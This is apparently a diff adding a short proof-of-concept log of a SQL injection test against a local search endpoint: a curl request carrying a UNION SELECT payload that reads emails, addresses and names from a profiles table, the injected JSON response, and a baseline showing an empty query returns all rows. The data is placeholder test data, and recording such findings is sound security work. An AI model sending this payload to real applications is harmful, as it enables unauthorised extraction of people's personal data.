@@ -1,0 +1,6 @@
+=== REQUEST ===
+curl -s -G 'http://127.0.0.1:8066/search' --data-urlencode "q=' UNION SELECT id,email,address,name FROM profiles-- "
+=== RESPONSE ===
+[{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 1, "name": "alice@example.invalid", "email": "TEST_ADDRESS_A", "address": "TEST_ALICE"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}, {"id": 2, "name": "bob@example.invalid", "email": "TEST_ADDRESS_B", "address": "TEST_BOB"}]
+--- baseline (empty q dumps all via LIKE '%%') ---
+[{"id": 1, "name": "TEST_ALICE", "email": "alice@example.invalid", "address": "TEST_ADDRESS_A"}, {"id": 2, "name": "TEST_BOB", "email": "bob@example.invalid", "address": "TEST_ADDRESS_B"}]
